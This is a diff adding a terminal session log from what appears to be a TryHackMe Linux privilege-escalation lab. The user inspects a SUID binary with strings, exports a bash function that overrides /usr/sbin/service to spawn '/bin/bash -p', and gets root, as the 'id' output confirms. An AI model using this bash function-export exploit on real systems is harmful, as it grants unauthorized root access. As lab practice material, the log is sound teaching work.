@@ -1,0 +1,45 @@
+Script started on 2025-03-22 18:55:47+03:00 [COMMAND="ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@linux.privesc.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+user@linux.privesc.thm's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
+]0;user@debian: ~user@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+]0;user@debian: ~user@debian:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+]0;user@debian: ~user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
+]0;user@debian: ~user@debian:~$ export -f /usr/sbin/service
+]0;user@debian: ~user@debian:~$ /usr/local/bin/suid-env2
+]0;root@debian: ~root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+]0;root@debian: ~root@debian:~# exit
+exit
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to linux.privesc.thm closed.
+
+Script done on 2025-03-22 18:56:45+03:00 [COMMAND_EXIT_CODE="0"]
